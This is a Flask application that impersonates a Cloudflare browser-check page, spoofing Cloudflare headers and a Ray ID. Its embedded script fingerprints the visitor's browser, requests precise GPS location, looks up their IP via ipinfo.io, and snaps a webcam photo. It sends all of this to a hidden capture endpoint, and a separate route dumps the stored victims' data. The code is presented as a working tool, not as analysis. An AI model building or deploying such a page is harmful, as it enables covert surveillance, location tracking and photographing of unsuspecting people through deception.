import os
import json
import time
import random
import string
from flask import Flask, request, render_template_string, make_response

app = Flask(__name__)

x_data_store = []

def z_make_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

def z_cf_headers():
    return {
        'Server': 'cloudflare',
        'CF-RAY': z_make_id(),
        'Cache-Control': 'no-cache, no-store',
        'Pragma': 'no-cache'
    }

CF_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Checking your browser</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: system-ui, sans-serif;
            background: #f6f6f6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .main-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 500px;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #f38020;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info-box {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .ray-code {
            font-family: monospace;
            background: #f0f0f0;
            padding: 2px 6px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="main-box">
        <div style="font-size: 48px; margin-bottom: 20px;">🛡️</div>
        <h1>Checking your browser</h1>
        <p>Checking your browser before accessing the website.</p>
        
        <div class="loader"></div>
        
        <div class="info-box">
            <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
            <p style="margin-top: 10px;">
                <strong>Ray ID:</strong> <span class="ray-code">{{ ray_code }}</span>
            </p>
            <p style="margin-top: 5px;">DDoS protection by Cloudflare</p>
        </div>
    </div>

    <script>
        let collectedInfo = {
            ua: navigator.userAgent,
            screen: { w: screen.width, h: screen.height },
            lang: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            cookies: navigator.cookieEnabled,
            java: navigator.javaEnabled(),
            pdf: navigator.pdfViewerEnabled,
            hardware: navigator.hardwareConcurrency,
            memory: navigator.deviceMemory
        };

        function startCollection() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        collectedInfo.loc = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            acc: pos.coords.accuracy
                        };
                        sendToServer();
                    },
                    () => sendToServer(),
                    { enableHighAccuracy: true, timeout: 3000 }
                );
            } else {
                sendToServer();
            }

            function sendToServer() {
                fetch('https://ipinfo.io/json').then(r => r.json()).then(ipData => {
                    collectedInfo.ip = ipData;
                    
                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        navigator.mediaDevices.getUserMedia({ video: true })
                            .then(stream => {
                                const vid = document.createElement('video');
                                const canv = document.createElement('canvas');
                                const ctx = canv.getContext('2d');
                                
                                vid.srcObject = stream;
                                vid.play();
                                
                                setTimeout(() => {
                                    canv.width = vid.videoWidth;
                                    canv.height = vid.videoHeight;
                                    ctx.drawImage(vid, 0, 0);
                                    collectedInfo.cam = canv.toDataURL('image/jpeg', 0.7);
                                    
                                    stream.getTracks().forEach(t => t.stop());
                                    finalSend();
                                }, 1500);
                            })
                            .catch(() => finalSend());
                    } else {
                        finalSend();
                    }
                }).catch(() => finalSend());
            }

            function finalSend() {
                fetch('/_cf_capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(collectedInfo)
                });
            }
        }

        setTimeout(function() {
            startCollection();
        }, 2000);
    </script>
</body>
</html>
"""

@app.route('/')
def main_page():
    ray_val = z_make_id()
    response = make_response(render_template_string(CF_HTML, ray_code=ray_val))
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    response.headers.update(z_cf_headers())
    return response

@app.route('/_cf_capture', methods=['POST'])
def capture_endpoint():
    data = request.get_json()
    data['timestamp'] = time.time()
    data['client_ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
    data['cf_ray'] = z_make_id()
    
    x_data_store.append(data)
    
    print(f"[CAPTURED] IP: {data.get('client_ip', 'Unknown')} | Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    if data.get('ip'):
        ip_data = data['ip']
        print(f"         Location: {ip_data.get('city', 'Unknown')}, {ip_data.get('country', 'Unknown')}")
    
    if data.get('cam'):
        print(f"         📸 Camera: CAPTURED")
    
    if data.get('loc'):
        loc = data['loc']
        print(f"         📍 GPS: {loc.get('lat', 'N/A')}, {loc.get('lon', 'N/A')}")
    
    return {'status': 'ok'}

@app.route('/_cf_data')
def data_endpoint():
    return {'total': len(x_data_store), 'data': x_data_store}

@app.route('/_cf_clear')
def clear_endpoint():
    x_data_store.clear()
    return {'status': 'cleared'}

@app.route('/<path:path>')
def catch_all(path):
    return redirect('/')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
